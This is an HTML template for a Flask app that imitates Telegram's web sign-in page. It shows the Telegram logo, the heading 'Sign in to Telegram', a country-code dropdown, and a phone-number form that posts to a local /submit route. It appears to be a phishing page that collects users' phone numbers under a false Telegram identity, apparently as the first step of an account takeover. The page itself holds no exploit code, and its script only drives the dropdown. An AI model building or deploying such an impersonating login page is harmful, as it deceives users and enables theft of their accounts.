<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <!-- favicon -->
    <link rel="icon" href="{{ url_for('static', filename='preference/logo.ico') }}" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            height: 78vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #212121;
        }
        p {
            font-size: 30px;
            color: white;
        }
        .subtitle {
            margin-top: -20px;
            font-size: 16px;
            color: #8e8e8e;
        }
        .scroll {
            width: 760px;
            max-height: 100vh;
            overflow-y: auto;
            background-color: #212121;
            padding: 7px;
            margin-top: 100px;
        }
        .input-container {
            width: 360px;
            position: relative;
            border: 2px solid #2f2f2f;
            border-radius: 10px;
            height: 54px;
            background-color: #212121;
            margin: 20px auto;
            transition: border-color 0.3s;
        }
        .input-container:hover,
        .input-container:focus-within {
            border-color: #9b59b6;
        }
        .input-label {
            position: absolute;
            left: 10px;
            top: -10px;
            background-color: #212121;
            color: #ccc;
            padding: 0 5px;
            font-size: 12px;
        }
        .custom-select {
            position: relative;
            width: 100%;
            cursor: pointer;
            color: white;
            background-color: transparent;
            border: none;
            height: 54px;
            padding: 16px;
            box-sizing: border-box;
        }
        .select-box {
            position: absolute;
            top: 54px;
            left: 0;
            right: 0;
            background-color: #212121;
            border-radius: 10px;
            display: none;
            z-index: 1;
            max-height: 200px;
            overflow-y: auto;
            box-shadow: -5px 20px 20px 5px rgba(0,0,0,0.3);
            text-align: center;
            padding: 0;
            margin: 0;
        }
        .select-option {
            display: flex;
            align-items: center;
            justify-content: left;
            padding: 20px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
        .select-option:hover {
            background-color: #2b2b2b;
        }
        .flag {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }
        .input-field {
            border: none;
            background-color: transparent;
            color: white;
            width: 100%;
            padding: 16px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .input-field:focus {
            outline: none;
        }
        .dropdown-arrow {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #ccc;
            font-size: 16px;
        }
        .subm_button {
            margin-top: 20px;
        }
        .button-fx {
            background-color: #8774e1;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 20px 160px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s;
            font-weight: bold;
        }
        .button-fx:hover {
            background-color: #907fe3;
        }
    </style>
</head>
<body>
    <div class="scroll">
        <div class="logot">
            <img src="{{ url_for('static', filename='image/tg.svg') }}" height="161" width="180" alt=" ">
            <p><b>Sign in to Telegram</b></p>
            <div class="subtitle">
                Please confirm your country code
                <br>
                and enter your phone number.
            </div>
        </div>
        <div class="content">
            <div class="input-container">
                <span class="input-label">Country</span>
                <div class="custom-select" id="countrySelect">
                    <div class="selected-option">Country</div>
                    <div class="dropdown-arrow"><img src="{{ url_for('static', filename='image/sv.svg') }}" width="32" alt="Стрелка вниз"></div>
                    <ul class="select-box" id="selectBox">
                        <li class="select-option" data-value="ru">
                            <img src="{{ url_for('static', filename='emojies/Russia.png') }}" class="flag" alt="Флаг России"> Российская Федерация (+7)
                        </li>
                        <li class="select-option" data-value="us">
                            <img src="https://flagcdn.com/w20/us.png" class="flag" alt="Флаг США"> США (+1)
                        </li>
                        <li class="select-option" data-value="de">
                            <img src="https://flagcdn.com/w20/de.png" class="flag" alt="Флаг Германии"> Германия (+49)
                        </li>
                        <li class="select-option" data-value="fr">
                            <img src="https://flagcdn.com/w20/fr.png" class="flag" alt="Флаг Франции"> Франция (+33)
                        </li>
                        <li class="select-option" data-value="uk">
                            <img src="https://flagcdn.com/w20/gb.png" class="flag" alt="Флаг Великобритании"> Великобритания (+44)
                        </li>
                    </ul>
                </div>
            </div>
<form action="/submit" method="post">
    <div class="input-container">
        <span class="input-label">Phone Number</span>
        <input type="text" class="input-field" name="phone" id="phone" placeholder="+7 --- --- ---" required>
    </div>
    <div class="subm_button">
        <button type="submit" class="button-fx">NEXT</button>
    </div>
</form>
        </div>


    <script>
        const countrySelect = document.getElementById('countrySelect');
        const selectBox = document.getElementById('selectBox');

        countrySelect.addEventListener('click', () => {
            selectBox.style.display = selectBox.style.display === 'block' ? 'none' : 'block';
        });

        const options = document.querySelectorAll('.select-option');
        options.forEach(option => {
            option.addEventListener('click', () => {
                const selectedText = option.innerText;
                countrySelect.querySelector('.selected-option').innerText = selectedText;
                selectBox.style.display = 'none';
                console.log(`Выбрана страна: ${selectedText}`);
            });
        });

        window.addEventListener('click', (event) => {
            if (!countrySelect.contains(event.target)) {
                selectBox.style.display = 'none';
            }
        });
    </script>
</body>
</html>
